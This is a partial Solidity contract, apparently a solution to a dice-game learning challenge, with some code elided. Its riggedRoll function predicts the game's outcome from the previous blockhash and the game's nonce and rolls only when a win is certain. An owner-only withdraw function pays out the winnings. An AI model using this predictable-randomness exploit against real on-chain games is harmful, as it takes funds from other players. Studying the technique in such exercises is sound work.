...
contract RiggedRoll is Ownable {
    ...
    function withdraw(address _addr, uint256 _amount) external onlyOwner {
        ...
        console.log(_addr);
        require(contractAddress.balance >= _amount, "Need to be greater");
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "KEK");
    }

    function riggedRoll() external payable {
        require(address(this).balance >= 0.002 ether, "hui");
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(this), diceGame.nonce)
        );
        uint256 roll = uint256(hash) % 16;
        require(roll == 0 || roll == 1 || roll == 2, "LOL");
